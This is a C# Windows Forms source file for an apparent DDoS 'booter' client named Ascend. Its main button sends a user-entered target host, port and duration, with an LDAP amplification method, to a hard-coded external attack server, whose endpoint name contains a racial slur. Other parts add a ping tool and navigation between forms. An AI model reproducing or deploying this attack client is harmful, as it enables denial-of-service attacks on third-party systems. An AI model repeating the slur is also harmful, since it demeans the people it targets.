using KeyAuth;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ascend
{
    public partial class Atacar : Form
    {
        int contador;
        public Atacar()
        {
            InitializeComponent();

            //Intentar ficar fons de pantalla
            try
            {
                string ImageLocation = @"C:\WINDOWS\IME\ImatgesAscend\fons.png";

                this.BackgroundImage = Image.FromFile(Path.Combine(ImageLocation));
                this.BackgroundImageLayout = ImageLayout.Stretch;
            }
            catch (Exception) { }

            //Intentar ficar foto de perfil
            try
            {
                string ImageLocation = @"C:\WINDOWS\IME\ImatgesAscend\imatge.png";

                pictureBox1.BackgroundImage = Image.FromFile(Path.Combine(ImageLocation));
            }
            catch (Exception) { }

            siticoneControlBox1.BackColor = System.Drawing.Color.Transparent;
            siticoneControlBox2.BackColor = System.Drawing.Color.Transparent;
            lbltitle.BackColor = System.Drawing.Color.Transparent;
        }

        //Enviar atac
        private void Login_button_Click(object sender, EventArgs e)
        {
            string target = host.Text;
            string puerto = port.Text;
            string tiempo = time.Text;
            {
                WebClient wc = new WebClient { };
                var resp = wc.UploadString("http://46.101.30.241/WhyYouHereLilNigger.php?host=​" + target + "&port=" + puerto + "&time=" + tiempo + "&method=LDAP", "POST");

                terminal.Text = "Atac enviat a " + target + " al port " + puerto + " per " + tiempo + " segons";
            }
        }

        //Fer ping a IP
        private void bunifuFlatButton1_Click(object sender, EventArgs e)
        {
            contador = contador + 1;
            if (ping.Text == "")
            {
                MessageBox.Show("No hi ha cap text escrit", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                void Pinger()
                {
                    Ping p = new Ping();
                    PingReply r;
                    string s;
                    s = ping.Text;
                    r = p.Send(s);

                    if (r.Status == IPStatus.Success)
                    {
                        terminal.Text = "Host = " + s.ToString() + " retard = " + r.RoundtripTime.ToString() + " ms" + "\n";
                    }
                    else if (r.Status != IPStatus.Success)
                    {
                        terminal.Text = "Host = " + s.ToString() + "No respon" + "\n";
                    }
                }

                try
                {
                    Pinger();
                }
                catch (Exception)
                {
                    MessageBox.Show("El text escrit no és una IP", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

            }
        }

        //Netejar
        private void bunifuFlatButton2_Click(object sender, EventArgs e)
        {
            terminal.Text = "";
            ping.Text = "";
            host.Text = "";
            port.Text = "";
            time.Text = "";
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        //Tancar app
        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void btnsettings_Click(object sender, EventArgs e)
        {
            this.Hide();
            Config f2 = new Config();
            f2.Show();
        }

        //Fer que la foto de perfil sigui rodona
        private void Atacar_Load(object sender, EventArgs e)
        {
            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
            gp.AddEllipse(0, 0, pictureBox1.Width - 3, pictureBox1.Height - 3);
            Region rg = new Region(gp);
            pictureBox1.Region = rg;
        }

        private void btnCalender_Click(object sender, EventArgs e)
        {
            this.Hide();
            TikTok f2 = new TikTok();
            f2.Show();
        }

        private void btnContactUs_Click(object sender, EventArgs e)
        {
            this.Hide();
            YouTube f2 = new YouTube();
            f2.Show();
        }

        private void btnDashbord_Click(object sender, EventArgs e)
        {
            this.Hide();
            Principal f2 = new Principal();
            f2.Show();
        }

        private void btnAnalytics_Click(object sender, EventArgs e)
        {

        }
    }
}
